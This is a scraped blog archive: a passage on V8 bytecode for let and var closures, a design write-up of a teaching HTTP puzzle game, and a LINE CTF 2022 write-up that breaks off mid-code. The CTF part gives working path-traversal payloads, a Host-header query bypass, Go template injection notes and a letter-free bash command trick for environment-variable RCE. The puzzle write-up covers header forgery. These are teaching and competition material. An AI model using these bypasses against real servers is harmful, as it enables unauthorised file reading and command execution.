find_me_var_timeout_inner] Parameter count 1 Frame size 24 332 E&gt; 0x25d2f37e6cf2 @ 0 : a0 StackCheck 343 S&gt; 0x25d2f37e6cf3 @ 1 : 13 00 00 LdaGlobal [0], [0] 0x25d2f37e6cf6 @ 4 : 26 fa Star r1 351 E&gt; 0x25d2f37e6cf8 @ 6 : 28 fa 01 02 LdaNamedProperty r1, [1], [2] 0x25d2f37e6cfc @ 10 : 26 fb Star r0 0x25d2f37e6cfe @ 12 : 1a 04 LdaCurrentContextSlot [4] 0x25d2f37e6d00 @ 14 : 26 f9 Star r2 351 E&gt; 0x25d2f37e6d02 @ 16 : 57 fb fa f9 04 CallProperty1 r0, r1, r2, [4] 0x25d2f37e6d07 @ 21 : 0d LdaUndefined 362 S&gt; 0x25d2f37e6d08 @ 22 : a4 Return Constant pool (size &#x3D; 2) Handler Table (size &#x3D; 0) Did you notice the line LdaCurrentContextSlot [4]? This line corresponds to what we said earlier, using this line in the inner function to take out i. So in the var example, a function context is first created, and from start to finish, there is only one context, which puts i in the slot_index 4, and the inner function also takes i from this position. Therefore, i only exists from start to finish. Finally, let’s take a look at the more complex let version: [generated bytecode for function: find_me_let_timeout] Parameter count 1 Register count 7 Frame size 56 179 E&gt; 0x2725c3d70daa @ 0 : a5 StackCheck 199 S&gt; 0x2725c3d70dab @ 1 : 0b LdaZero 0x2725c3d70dac @ 2 : 26 f8 Star r3 0x2725c3d70dae @ 4 : 26 fb Star r0 0x2725c3d70db0 @ 6 : 0c 01 LdaSmi [1] 0x2725c3d70db2 @ 8 : 26 fa Star r1 293 E&gt; 0x2725c3d70db4 @ 10 : a5 StackCheck 0x2725c3d70db5 @ 11 : 82 00 CreateBlockContext [0] 0x2725c3d70db7 @ 13 : 16 f7 PushContext r4 0x2725c3d70db9 @ 15 : 0f LdaTheHole 0x2725c3d70dba @ 16 : 1d 04 StaCurrentContextSlot [4] 0x2725c3d70dbc @ 18 : 25 fb Ldar r0 0x2725c3d70dbe @ 20 : 1d 04 StaCurrentContextSlot [4] 0x2725c3d70dc0 @ 22 : 0c 01 LdaSmi [1] 0x2725c3d70dc2 @ 24 : 67 fa 00 TestEqual r1, [0] 0x2725c3d70dc5 @ 27 : 99 07 JumpIfFalse [7] (0x2725c3d70dcc @ 34) 0x2725c3d70dc7 @ 29 : 0b LdaZero 0x2725c3d70dc8 @ 30 : 26 fa Star r1 0x2725c3d70dca @ 32 : 8b 08 Jump [8] (0x2725c3d70dd2 @ 40) 211 S&gt; 0x2725c3d70dcc @ 34 : 1a 04 LdaCurrentContextSlot [4] 0x2725c3d70dce @ 36 : 4c 01 Inc [1] 211 E&gt; 0x2725c3d70dd0 @ 38 : 1d 04 StaCurrentContextSlot [4] 0x2725c3d70dd2 @ 40 : 0c 01 LdaSmi [1] 0x2725c3d70dd4 @ 42 : 26 f9 Star r2 204 S&gt; 0x2725c3d70dd6 @ 44 : 1a 04 LdaCurrentContextSlot [4] 0x2725c3d70dd8 @ 46 : 26 f6 Star r5 0x2725c3d70dda @ 48 : 0c 0a LdaSmi [10] 204 E&gt; 0x2725c3d70ddc @ 50 : 69 f6 02 TestLessThan r5, [2] 0x2725c3d70ddf @ 53 : 99 04 JumpIfFalse [4] (0x2725c3d70de3 @ 57) 0x2725c3d70de1 @ 55 : 8b 06 Jump [6] (0x2725c3d70de7 @ 61) 0x2725c3d70de3 @ 57 : 17 f7 PopContext r4 0x2725c3d70de5 @ 59 : 8b 33 Jump [51] (0x2725c3d70e18 @ 110) 0x2725c3d70de7 @ 61 : 0c 01 LdaSmi [1] 0x2725c3d70de9 @ 63 : 67 f9 03 TestEqual r2, [3] 0x2725c3d70dec @ 66 : 99 1c JumpIfFalse [28] (0x2725c3d70e08 @ 94) 186 E&gt; 0x2725c3d70dee @ 68 : a5 StackCheck 221 S&gt; 0x2725c3d70def @ 69 : 13 01 04 LdaGlobal [1], [4] 0x2725c3d70df2 @ 72 : 26 f6 Star r5 0x2725c3d70df4 @ 74 : 81 02 06 02 CreateClosure [2], [6], #2 0x2725c3d70df8 @ 78 : 26 f5 Star r6 221 E&gt; 0x2725c3d70dfa @ 80 : 5d f6 f5 07 CallUndefinedReceiver1 r5, r6, [7] 0x2725c3d70dfe @ 84 : 0b LdaZero 0x2725c3d70dff @ 85 : 26 f9 Star r2 0x2725c3d70e01 @ 87 : 1a 04 LdaCurrentContextSlot [4] 0x2725c3d70e03 @ 89 : 26 fb Star r0 0x2725c3d70e05 @ 91 : 8a 1e 01 JumpLoop [30], [1] (0x2725c3d70de7 @ 61) 0x2725c3d70e08 @ 94 : 0c 01 LdaSmi [1] 293 E&gt; 0x2725c3d70e0a @ 96 : 67 f9 09 TestEqual r2, [9] 0x2725c3d70e0d @ 99 : 99 06 JumpIfFalse [6] (0x2725c3d70e13 @ 105) 0x2725c3d70e0f @ 101 : 17 f7 PopContext r4 0x2725c3d70e11 @ 103 : 8b 07 Jump [7] (0x2725c3d70e18 @ 110) 0x2725c3d70e13 @ 105 : 17 f7 PopContext r4 0x2725c3d70e15 @ 107 : 8a 61 00 JumpLoop [97], [0] (0x2725c3d70db4 @ 10) 0x2725c3d70e18 @ 110 : 0d LdaUndefined 295 S&gt; 0x2725c3d70e19 @ 111 : a9 Return Constant pool (size &#x3D; 3) Handler Table (size &#x3D; 0) Because this code is a bit too long and not easy to read, I modified it and rewrote a more straightforward version: r1 = 1 r0 = 0 loop: r4.push(new BlockContext()) CurrentContextSlot = r0 if (r1 === 1) &#123; r1 = 0 &#125; else &#123; CurrentContextSlot++ &#125; r2 = 1 r5 = CurrentContextSlot if (!(r5 &lt; 10)) &#123; // end loop PopContext r4 goto done &#125; loop2: if (r2 === 1) &#123; setTimeout() r2 = 0 r0 = CurrentContextSlot goto loop2 &#125; if (r2 === 1) &#123; PopContext r4 goto done &#125; PopContext r4 goto loop done: return undefined The first key point is that CreateBlockContext is called for each loop, creating a new context, and then before the loop ends, the value of CurrentContextSlot (i.e., i) is stored in r0, and then in the next loop, the value of the new block context slot is read from r0 and incremented to implement the accumulation of different context values. Then you might wonder, where exactly will this block context be used? In the bytecode above, this part calls setTimeout: LdaGlobal [1], [4] Star r5 &#x2F;&#x2F; r5 &#x3D; setTimeout CreateClosure [2], [6], #2 Star r6 &#x2F;&#x2F; r6 &#x3D; new function(...) CallUndefinedReceiver1 r5, r6, [7] &#x2F;&#x2F; setTimeout(r6) When we call CreateClosure and pass this closure to setTimeout, we also pass it in (only the context part is retained): // CreateClosure &lt;index> &lt;slot> &lt;tenured> // // Creates a new closure for SharedFunctionInfo at position |index| in the // constant pool and with the PretenureFlag &lt;tenured>. IGNITION_HANDLER(CreateClosure, InterpreterAssembler) &#123; Node* context = GetContext(); Node* result = CallRuntime(Runtime::kNewClosure, context, shared, feedback_cell); SetAccumulator(result); Dispatch(); &#125; Therefore, when LdaCurrentContextSlot is called in the inner function, it will load the correct context and i. Conclusion: The var version is CreateFunctionContext, and there is only one context from start to finish. The let version calls CreateBlockContext for each loop, and there are a total of 10 contexts. In cases where closure is not needed, there is no difference between let and var in V8. SummarySome questions that you think have “obvious” answers may not necessarily be so. For example, consider the following example: function v1() &#123; var a = 1 for(var i=1;i&lt;10; i++)&#123; var a = 1 &#125; &#125; function v2() &#123; var a = 1 for(var i=1; i&lt;10; i++) &#123; a = 1 &#125; &#125; Which is faster, v1 or v2? “v1 will re-declare and assign a every loop, while v2 will only declare it once outside and only assign it inside the loop, so v1 is faster.” The answer is that they are exactly the same, because if you understand JS well enough, you will know that there is no such thing as “re-declaration”, as the declaration is processed during the compilation phase. Even if there is a performance difference, how much is it? Is it worth our effort to focus on the difference? For example, when writing React, we are often taught to avoid inline functions: // Good render() &#123; &lt;div onClick=&#123;this.onClick&#125; /> &#125; // Bad render() &#123; &lt;div onClick=&#123;() => &#123; /* do something */ &#125;&#125; /> &#125; It makes sense to think that the second one is faster, because every time the render is called, a new function is created in the first one, while the second one only assigns a value inside the loop. Although there is indeed a performance difference between them, this difference may be smaller than you think. Finally, let’s take a look at one last example: // A var obj = &#123;a:1, b:2, ...&#125; // 非常大的 object // B var obj = JSON.parse('&#123;\"a\": 1, \"b\": 2, ...&#125;') // JSON.parse 搭配很長的字串 If A and B both represent a very large object, which one is faster? Intuitively, it seems that A is faster, because B seems to be redundant, first converting the object to a string and then passing it to JSON.parse, adding an extra step. But in fact, B is faster, and more than 1.5 times faster. Many things may seem the same at first glance, but in reality, they can be quite different. Intuition is one thing, but when it comes to the underlying optimizations done by compilers or even the operating system, taking those into consideration can lead to a completely different outcome. Just like the topic discussed in this article, it may seem intuitive that let is slower than var. However, in cases where closures are not needed, there is no difference between the two. To address these issues, you can certainly make guesses, but you should know that they are just that - guesses. To find out the correct answer, a more scientific approach is necessary, rather than just relying on “I think”.","link":"/2020/02/20/en/let-vs-var-bytecode/"},{"title":"Behind the Scenes: Design and Easter Eggs of Lidemy HTTP Challenge","text":"IntroductionRecently, I created a small game called Lidemy HTTP Challenge to help my students become more familiar with HTTP and API integration. The game requires players to obtain the correct token according to the instructions of each level. There are a total of fifteen levels, with the first ten being basic and the last five being advanced. After some testing by friends and some adjustments and improvements, I let my students test it and found that the response was good. So I officially released this game to the front-end community so that everyone could participate. If you haven’t played it yet, I strongly recommend that you don’t read this article because it will spoil the fun of playing the game (like a movie spoiler). I suggest you play it first, then come back and read this article to get a different experience. Next, I will talk about the process of creating this game and the design of each level. Standing on the Shoulders of GiantsThis technique of using games as a shell but filling it with technical content should not be unfamiliar to most people, at least not to me. The idea of making a game actually came from a student who sent me this: devtest, which is a French company’s interview question. If you see a blank screen, don’t worry, the webpage is not broken. After completing the above game, I remembered that I was actually very familiar with this type of game. I played 高手過招 and similar games like Hack This Site! when I was a child. Or there was a time when puzzle games were popular (not related to programming), and I once made one myself. At that time, I used the password-locked method of PIXNET articles to create levels, which is a very convenient method in retrospect. Anyway, although I played them all when I was a child, I gradually forgot about this type of game as I grew up. The advantage of this type of game is that it is a game. If the game is well made, everyone will love it. And it is much more interesting than the usual question-and-answer or short-answer questions, so games are a good entry point. After remembering the benefits of games, I decided to make one myself, and the theme was the Web API integration that my students were least familiar with! The Initial IdeaThe initial idea was: I hope this is a game that you can play with curl. Because I think it’s cool that you can play this game with terminal and commands, without even opening a browser! Therefore, in terms of presentation, I planned to use pure text from the beginning, without any links or fancy things. It’s just a plain text file! If there are links, there won’t be &lt;a&gt;, just a URL. In terms of form, it is similar to other games that use checkpoints. After roughly deciding on the form, it is time to decide what content each level should have. At first, I wanted to make twenty levels, but after listing the topics I wanted to appear, I realized that I could only make about six or seven levels. The original plan is as follows: CRUD must be included to make students familiar with the four basic operations of API integration. Custom headers must be included. Origin-related topics must be included. User agent-related topics must be included. The reason why the last three must be included is that I think they are also important in understanding HTTP and API integration. Custom headers often bring additional information or are used for verification. Origin is to make students understand that the same origin policy is only related to browsers and has no restrictions outside of browsers. User agent is quite practical in work, and it is necessary to determine the user’s browser or detect whether it is a search engine to do corresponding processing. The things that need to appear are roughly thought out, and finally, it is the design of the content and token. If the content of the game is only “Please POST a piece of data to XXX,” it would be too boring, so I set the scene to be that the player is a novice who goes to the library to help an old man solve some problems with the library information system. As for the book data, I quickly crawled a website and did some processing, so the data part was quickly done. After having the story, I also wanted to hide some Easter eggs in it. Rather than saying it is an Easter egg, it is more like some interesting little things that I think people might find. Therefore, there are some hidden things in the content and token of each level. I remember that I spent about two days on the initial version. One day for designing levels and another day for writing code. The part of designing levels took longer because the implementation of the code was quite simple. Next, let’s take a look at the content of each level of the first ten levels! Again, if you haven’t completed it yet, I strongly recommend not to view it! Quickly go and play: Lidemy HTTP Challenge. Level 1啊...好久沒有看到年輕人到我這個圖書館了，我叫做 lib，是這個圖書館的管理員 很開心看到有年輕人願意來幫忙，最近圖書館剛換了資訊系統，我都搞不清楚怎麼用了... 這是他們提供給我的文件，我一個字都看不懂，但對你可能會有幫助 先把這文件放一旁吧，這個待會才會用到 你叫做什麼名字呢？用 GET 方法跟我說你的 name 叫做什麼吧！ 除了 token 以外順便把 name 一起帶上來就可以了 The first level is just to let everyone get the API documentation and familiarize themselves with the fact that some levels will require information to be directly carried in the URL. Therefore, the first level is just to let everyone familiarize themselves with the environment. After passing in the name, you can get the token for the second level. Actually, at the beginning, many people got stuck here because the instructions were not clear, so some people thought they had to call the API or something. Later, I changed the instructions and tried to make them as clear as possible, and also added a hint function. Level 2我前陣子在整理書籍的時候看到了一本我很喜歡的書，可是現在卻怎麼想都想不起來是哪一本... 我只記得那本書的 id 是兩位數，介於 54~58 之間，你可以幫幫我嗎？ 找到是哪一本之後把書的 id 用 GET 傳給我就行了。 The ID range for this level is 54-58, and the original intention was to let everyone try one by one, without any other methods. The hidden Easter egg here is that the book with ID 56 is the book “5566 - Seriously” by Zheng Peifen: &#123;&quot;id&quot;:56,&quot;name&quot;:&quot;5566－認真&quot;,&quot;author&quot;:&quot;鄭佩芬&quot;,&quot;ISBN&quot;:&quot;0614361311&quot;&#125; So the token for the next level will be 5566NO1. Level 3真是太感謝你幫我找到這本書了！ 剛剛在你找書的時候有一批新的書籍送來了，是這次圖書館根據讀者的推薦買的新書，其中有一本我特別喜歡，想要優先上架。 書名是《大腦喜歡這樣學》，ISBN 為 9789863594475。 就拜託你了。 新增完之後幫我把書籍的 id 用 GET 告訴我。 This level is just testing whether you know how to use POST. There is a small detail that the original API documentation did not write clearly about how to POST, whether the content type is form or JSON? So later I added this part to avoid ambiguity. Level 4我翻了一下你之前幫我找的那本書，發現我記錯了...這不是我朝思暮想的那一本。 我之前跟你講的線索好像都是錯的，我記到別本書去了，真是抱歉啊。 我記得我想找的那本書，書名有：「世界」兩字，而且是村上春樹寫的，可以幫我找到書的 id 並傳給我嗎？ This level tests whether you can use the parameters of the API to query books, but cheating by searching locally is also possible. I love Haruki Murakami, and I have a friend who loves the book “The End of the World and the Cold and Cruel Land”. So I put it in. In order to avoid only one result when searching for “world”, I also found several other books with this keyword and put them in. The token for the next level, “HarukiMurakami”, is the name of Haruki Murakami. Level 5昨天有個人匆匆忙忙跑過來說他不小心捐錯書了，想要來問可不可以把書拿回去。 跟他溝通過後，我就把他捐過來的書還他了，所以現在要把這本書從系統裡面刪掉才行。 那本書的 id 是 23，你可以幫我刪掉嗎？ This level is just testing the use of DELETE, with no difficulty. The hidden Easter egg here is that the book he donated by mistake is the photo album of Chicken Cutlet Girl, so he wants to get it back quickly. This also corresponds to the token for the next level: CHICKENCUTLET. Level 6我終於知道上次哪裡怪怪的了！ 照理來說要進入系統應該要先登入才對，怎麼沒有登入就可以新增刪除... 這太奇怪了，我已經回報給那邊的工程師了，他們給了我一份新的文件： 這邊是帳號密碼，你先登入試試看吧，可以呼叫一個 &#x2F;me 的 endpoint，裡面會給你一個 email。 把 email 放在 query string 上面帶過來，我看看是不是對的。 帳號：admin 密碼：admin123 For beginners, this is actually a more challenging level. This level tests whether you know how to put content in the header and how to use HTTP basic authorization based on data. The main purpose is to let everyone know one of the authentication methods of HTTP. Level 7那邊的工程師說系統整個修復完成了，剛好昨天我們發現有一本書被偷走了... 這本書我們已經買第五次了，每次都被偷走，看來這本書很熱門啊。 我們要把這本書從系統裡面刪掉，就拜託你了。 對了！記得要用新的系統喔，舊的已經完全廢棄不用了。 書的 id 是 89。 Actually, I just added a level to delete data because I ran out of ideas. A small episode here is that there was no “By the way! Remember to use the new system, the old one is completely obsolete.” at first, which caused some people to still use the old API, so I added it to avoid confusion. If you actually go to see this popular book, you will find that it is “Following the Moon: Han Kuo-yu’s Night Raid Spirit and Enterprising Life”, corresponding to the token for the next level: HsifnAerok, which is KoreanFish spelled backwards. Level 8我昨天在整理書籍的時候發現有一本書的 ISBN 編號跟系統內的對不上，仔細看了一下發現我當時輸入系統時 key 錯了。 哎呀，人老了就是這樣，老是會看錯。 那本書的名字裡面有個「我」，作者的名字是四個字，key 錯的 ISBN 最後一碼為 7，只要把最後一碼改成 3 就行了。 對了！記得要用新的系統喔，舊的已經完全廢棄不用了。 This level is just testing finding and modifying data, with nothing special. The token for the next level, “NeuN”, is German for nine. Level 9API 文件裡面有個獲取系統資訊的 endpoint 你記得嗎？ 工程師跟我說這個網址不太一樣，用一般的方法是沒辦法成功拿到回傳值的。 想要存取的話要符合兩個條件： 1. 帶上一個 X-Library-Number 的 header，我們圖書館的編號是 20 2. 伺服器會用 user agent 檢查是否是從 IE6 送出的 Request，不是的話會擋掉 順利拿到系統資訊之後應該會有個叫做 version 的欄位，把裡面的值放在 query string 給我吧。 This level tests two things: Whether you can pass custom headers Whether you know how to change the user agent, and whether you know what the user agent represents These are the elements that I must put in, as I think they are important. I want students to know that the user agent actually has many functions, one of which includes letting the server know about your browser and operating system, etc.; I also want them to know that these things can be forged. Originally, the server was set to check whether the request was sent from Safari, but people using Macs could pass the level by using Safari, so later it was changed to use IE6. If you want to install IE6’s VM, then I give up XD The token for the next level is duZDsG3tvoA, which is the YouTube video ID, corresponding to Jay Chou’s “Peninsula Iron Box”. Because I really like this song, and it has something to do with the book. Level 10時間過得真快啊，今天是你在這邊幫忙的最後一天了。 我們來玩個遊戲吧？你有玩過猜數字嗎？ 出題者會出一個四位數不重複的數字，例如說 9487。 你如果猜 9876，我會跟你說 1A2B，1A 代表 9 位置對數字也對，2B 代表 8 跟 7 你猜對了但位置錯了。 開始吧，把你要猜的數字放在 query string 用 num 當作 key 傳給我。 Originally, I wanted everyone to really play the guessing game, and it was expected to take about five or six guesses to pass the level. But I didn’t write the judgment logic well, so if you pass in a number or a repeated number, I won’t block it, or if you want to try all 9999 combinations directly, no one will stop you, so there are many ways to solve this problem. So far, this is the content of the first ten levels. First OptimizationAfter completing the first ten levels, I let some friends try it out and the feedback was good, but I also found some problems, some of which I have already mentioned above, such as: The instructions for the first level are not clear, and it is unclear where the name should be passed. There is no prompt to use the new API, and it is thought that the old one can be used. If the browser restricts Safari in a certain level, it is easy for Mac users. The above problems can basically be improved by strengthening the textual description, but there is still a bigger problem: Stuck Although it is common for people to get stuck, I don’t want everyone to be stuck all the time. After all, the ultimate goal of this game is actually to learn, and fun is just an added value for me. But I can’t destroy the game experience and explain the answer directly, so I must provide a way for them to see the hints. You may ask me why not use white text for the hints, it’s so troublesome to add &amp;hint=1. You may have forgotten that I said at the beginning that I wanted curl to be able to play this game, so white text is useless. Anyway, the hint function was added in the end, making the game more complete and the experience better. The game originally ended here, but I happened to have some inspiration, so I continued to do some levels. Let’s talk about the advanced levels below. Level 11嘿！很開心看到你願意回來繼續幫忙，這次我們接到一個新的任務，要跟在菲律賓的一個中文圖書館資訊系統做串連 這邊是他們的 API 文件，你之後一定會用到。 現在就讓我們先跟他們打個招呼吧，只是我記得他們的 API 好像會限制一些東西就是了... This level is the one mentioned at the beginning that must be done for the origin-related levels. It is placed in the advanced levels because I am afraid it is too difficult for my students, so I put it here. In short, I want everyone to understand that even if the server checks the origin, the client can easily forge it. And this has nothing to do with the browser’s CORS. Everyone should be very clear that sending a request from the browser and sending a request by themselves are two very different things. The former will have many restrictions, while the latter will not. The token for the next level is r3d1r3c7, which is the redirect in leet, hinting at the solution for the next level. Level 12打完招呼之後我們要開始送一些書過去了，不過其實運送沒有你想像中的簡單，不是單純的 A 到 B 而已 而是像轉機那樣，A 到 C，C 才到 B，中間會經過一些轉運點才會到達目的地...算了，我跟你說那麼多幹嘛 現在請你幫我把運送要用的 token 給拿回來吧，要有這個 token 我們才能繼續往下一步走 This level is also a level that I really wanted to put in later. I think this concept is quite interesting. By stuffing something in the middle of the redirect process, it forces everyone to understand what the principle of server-side redirect is (301 and 302 status codes). If you don’t understand why you can redirect and the principle behind it, you won’t be able to solve this problem. The token for the next level is qspyz, which becomes proxy after shifting one character to the left, hinting at the solution for the next level. Level 13太好了！自從你上次把運送用的 token 拿回來以後，我們就密切地與菲律賓在交換書籍 可是最近碰到了一些小問題，不知道為什麼有時候會傳送失敗 我跟他們反映過後，他們叫我們自己去拿 log 來看，你可以幫我去看看嗎？ 從系統日誌裡面應該可以找到一些端倪。 This level is testing the use of a proxy, because the server checks whether the user’s IP is from the Philippines. The method of checking is using node-geoip: advancedRouter.get('/logs', (req, res) => &#123; const ip = req.ip || '' const info = geoip.lookup(ip) || &#123;&#125; if (info.country === 'PH') &#123; res.end(text.lv13.reply) &#125; else &#123; res.end(text.lv13.wa) &#125; &#125;) So as long as you find a proxy in the Philippines to send a request, you can pass the level. However, there are two unexpected things about this level. The first thing is that many people will try to forge the Accept-Language header, which I didn’t think of at all (but it doesn’t matter). The second thing is that there is another solution to this problem, which is to forge X-Forwarded-For, which is something I didn’t think of at all. I have set app.set(&#39;trust proxy&#39;, true) in Express, so when getting the user’s IP, if there is the X-Forwarded-For header, the information here will be used. I happened to read a similar article recently: The Cause and Prevention of the X-Forwarded-For Header Forgery Vulnerability. Although it is not the solution I originally intended, I think this solution is more interesting, so I didn’t specifically fix it. Level 14跟那邊的溝通差不多都搞定了，真是太謝謝你了，關於這方面沒什麼問題了！ 不過我老大昨天給了我一個任務，他希望我去研究那邊的首頁內容到底是怎麼做的 為什麼用 Google 一搜尋關鍵字就可以排在第一頁，真是太不合理了 他們的網站明明就什麼都沒有，怎麼會排在那麼前面？ 難道說他們偷偷動了一些手腳？讓 Google 搜尋引擎看到的內容跟我們看到的不一樣？ 算了，還是不要瞎猜好了，你幫我們研究一下吧！ This level wants everyone to know that not only browsers, but also various crawlers will bring specific User-Agent, so the server can still output different information for different UA (although it is not recommended). For example, an SPA can only enable server-side rendering for Google search engines and Facebook to output content, and client-side rendering for ordinary users. Or like the HTTP Challenge website, it has processed different UA (because the website is all text, but I hope to have a custom title and description when shared on Facebook): // base on UA return differect result router.get('/start', (req, res) => &#123; const UA = req.header('User-Agent') || '' if (UA.indexOf('facebookexternalhit') >= 0 || UA.indexOf('Googlebot') >= 0 )&#123; res.end(text.seo) &#125; else &#123; res.end(text.start.intro) &#125; &#125;) But it seems a bit strange, I don’t know if it succeeded. This is the last level, and Level 15 is the conclusion. Second OptimizationAfter completing the advanced levels, the description part has actually been changed a bit, for example, some students in Level 14 thought it was related to Chrome (thinking of Google only reminds them of Chrome XD), so I specifically emphasized that it is “Google search engine” that they should look for in this direction. One of the most surprising solutions to me was the X-Forwarded-For in level 13. After it was made public, a friend suggested that I should put a gist at the end for people to leave comments. I was surprised because I didn’t think of that before. I had thought about adding a leaderboard or a comment board so that people who completed the game could leave a message as a souvenir, but it was too troublesome to implement and I was too lazy to do it. It was only when my friend reminded me that I realized that gist already has a built-in comment function, so I just put a gist there! Therefore, the early players did not have a gist to leave comments on, it was added later. ConclusionI am very happy to be able to package this knowledge into a game and share it with everyone, and the feedback seems to be quite good. Although some people are looking forward to new levels, I currently have no inspiration. What is more likely to happen in the future is to make an HTML, CSS, and JavaScript version, which is similar in type, but the solutions and knowledge points for each level are different. I will share it with you when the time comes. Thanks to the friends who helped me test it early on, and thanks to everyone who enjoyed the game with me. Below are some related experiences of completing the game, you can take a look if you are interested: One-day librarian: HTTP Challenge HTTP_Game攻略(一) Lidemy HTTP 圖書館小弟加班(V2) 小挑戰 http game 解題思路心得想法","link":"/2019/05/18/en/lidemy-http-challenge/"},{"title":"LINE CTF 2022 Notes","text":"I participated in LINE CTF 2022 with the team Water Paddler and we ranked seventh with the help of my teammates. I only contributed to one question, while the others were solved by my teammates or stuck. This article briefly summarizes the solutions to each question, most of which are referenced from LINE CTF 2022 Writeups by maple3142. gotm(96 solves)This question was solved by my teammates, so I didn’t look into it carefully. However, after the game, I read other writeups and found that it was a go SSTI, which appeared here: acc := get_account(id) tpl, err := template.New(\"\").Parse(\"Logged in as \" + acc.id) if err != nil &#123; &#125; tpl.Execute(w, &amp;acc) I haven’t encountered go SSTI before, so I took some notes. You can use {&#123;.&#125;&#125; to dump the entire object passed in. Here are a few reference links: GO中SSTI研究 Go SSTI初探 Memo Drive(42 solves)First, here is the key code: def view(request): context = &#123;&#125; try: context['request'] = request clientId = getClientID(request.client.host) if '&amp;' in request.url.query or '.' in request.url.query or '.' in unquote(request.query_params[clientId]): raise filename = request.query_params[clientId] path = './memo/' + \"\".join(request.query_params.keys()) + '/' + filename f = open(path, 'r') contents = f.readlines() f.close() context['filename'] = filename context['contents'] = contents The flag for this question is in ./memo/flag, so all we need to do is find a way to read the flag from the path in the above code. My teammate used this payload: /view?id=flag;%2f%2e%2e/;. Since I’m not familiar with Python, I set up a simple server to observe: from urllib.parse import unquote import uvicorn from starlette.applications import Starlette from starlette.routing import Route from starlette.responses import JSONResponse def view(request): try: clientId = \"id\" print(\"request.url:\", request.url) print(\"request.url.query\", request.url.query) print(\"params:\", request.query_params) print(\"unquote params:\", unquote(request.query_params[clientId])) if '&amp;' in request.url.query or '.' in request.url.query or '.' in unquote(request.query_params[clientId]): raise filename = request.query_params[clientId] print(\"filename:\", filename) print(\"keys:\", request.query_params.keys()) path = './memo/' + \"\".join(request.query_params.keys()) + '/' + filename print(\"path:\", path) except: pass return JSONResponse(&#123;\"a\":1&#125;) routes = [ Route('/view', endpoint=view) ] app = Starlette(debug=True, routes=routes) if __name__ == \"__main__\": uvicorn.run(app, host=\"0.0.0.0\", port=11000) Let’s take a look at what my teammate’s payload does: /view?id=flag;%2f%2e%2e/; request.url: http:&#x2F;&#x2F;0.0.0.0:11000&#x2F;view?id&#x3D;flag;%2f%2e%2e&#x2F;; request.url.query id&#x3D;flag;%2f%2e%2e&#x2F;; params: id&#x3D;flag&amp;%2F..%2F&#x3D; unquote params: flag filename: flag keys: dict_keys([&#39;id&#39;, &#39;&#x2F;..&#x2F;&#39;]) path: .&#x2F;memo&#x2F;id&#x2F;..&#x2F;&#x2F;flag request.url is the raw URL without decoding, and request.url.query is also the undecoded version. When it reaches request.query_params, it is parsed into two params: id&#x3D;flag %2F..%2f&#x3D; It seems that even if you don’t use &amp;, you can create two params because of the semicolon ;. Finally, when request.query_params.keys() is decoded, it becomes ./memo/id..//flag. However, I saw on Discord that this is enough: id=flag;/%2e%2e. The result is: request.url: http://0.0.0.0:11000/view?id=flag;/%2e%2e request.url.query id=flag;/%2e%2e params: id=flag&amp;%2F..= unquote params: flag filename: flag keys: dict_keys(['id', '/..']) path: ./memo/id/../flag I also saw a different solution on Discord (from bbangjo#3967), which uses the Host header: GET http:&#x2F;&#x2F;0.0.0.0:11000&#x2F;view?id&#x3D;flag&amp;&#x2F;.. Host: 0.0.0.0# It produces a magical result: request.url: http:&#x2F;&#x2F;0.0.0.0#&#x2F;view?id&#x3D;flag&amp;&#x2F;.. request.url.query params: id&#x3D;flag&amp;%2F..&#x3D; unquote params: flag filename: flag keys: dict_keys([&#39;id&#39;, &#39;&#x2F;..&#39;]) path: .&#x2F;memo&#x2F;id&#x2F;..&#x2F;flag Although request.url.query disappears completely, request.query_params still has something, so it bypasses the check for request.url.query. According to him, since request.url is constructed from the Host header, we can check the code to verify it. If I’m not mistaken, it should be here: starlette&#x2F;datastructures.py#L38: if host_header is not None: url = f\"&#123;scheme&#125;://&#123;host_header&#125;&#123;path&#125;\" Because the Host is followed by a #, the query string behind it is parsed as a fragment, not a query string. Therefore, request.url.query will be empty. Why does request.query_params still have something? Because it directly takes the original query string, not request.url.query, here: starlette&#x2F;requests.py#L116 @property def query_params(self) -> QueryParams: if not hasattr(self, \"_query_params\"): self._query_params = QueryParams(self.scope[\"query_string\"]) return self._query_params This is a difference that can only be found by looking at the source code. Supplement on March 29, 2022: Thanks to @Zedd for reminding us that the behavior of treating ; as &amp; is related to the Python version, because it can cause cache poisoning. This issue has been fixed in newer versions, and the version used in the challenge is 3.9.0, which is why this problem exists. When I reproduced it on my local machine, I also used an unpatched version. The vulnerability number is CVE-2021-23336, and details can be found here: urllib parse_qsl(): Web cache poisoning - semicolon as a query args separator. bb(27 solves)The code is very short: &lt;?php error_reporting(0); function bye($s, $ptn)&#123; if(preg_match($ptn, $s))&#123; return false; &#125; return true; &#125; foreach($_GET[\"env\"] as $k=>$v)&#123; if(bye($k, \"/=/i\") &amp;&amp; bye($v, \"/[a-zA-Z]/i\")) &#123; putenv(\"&#123;$k&#125;=&#123;$v&#125;\"); &#125; &#125; system(\"bash -c 'imdude'\"); foreach($_GET[\"env\"] as $k=>$v)&#123; if(bye($k, \"/=/i\")) &#123; putenv(\"&#123;$k&#125;\"); &#125; &#125; highlight_file(__FILE__); ?> Basically, it is to achieve RCE after controlling the environment variables, which naturally reminds people of the article published by P cow some time ago: How I hack bash through environment injection, which mentions that commands can be executed by controlling BASH_ENV. However, the more troublesome thing is that a-zA-Z cannot be used, so you have to write instructions to read the flag and return it to your own server without using English letters. Someone in the chat room gave a link to a similar problem for reference: 34C3 CTF &#x2F; Tasks &#x2F; minbashmaxfun &#x2F; Writeup. After reading the writeup given at the beginning, I realized that it can be used like this: # Equivalent to $&#39;id&#39; $&#39;\\151\\144&#39; By doing this, you can bypass the restrictions without using letters. Bash is really profound. Someone posted this string on Discord, which is worth referring to and taking notes: Readable version, Twitter original string: https://twitter.com/DissectMalware/status/1023682809368653826 online library(19 solves)This is a web page that can read a specific file range, and the key is in this part: app.get(\"/:t/:s/:e\", (req: Express.Request, res: Express.Response): void => &#123; const s: number = Number(req.params.s) const e: number = Number(req.params.e) const t: string = req.params.t if ((/[\\x00-\\x1f]|\\x7f|\\&lt;|\\>/).test(t)) &#123; res.end(\"Invalid character in book title.\") &#125; else &#123; Fs.stat(`public/$&#123;t&#125;`, (err: NodeJS.ErrnoException, stats: Fs.Stats): void => &#123; if (err) &#123; res.end(\"No such a book in bookself.\") &#125; else &#123; if (s !== NaN &amp;&amp; e !== NaN &amp;&amp; s &lt; e) &#123; if ((e - s) > (1024 * 256)) &#123; res.end(\"Too large to read.\") &#125; else &#123; Fs.open(`public/$&#123;t&#125;`, \"r\", (err: 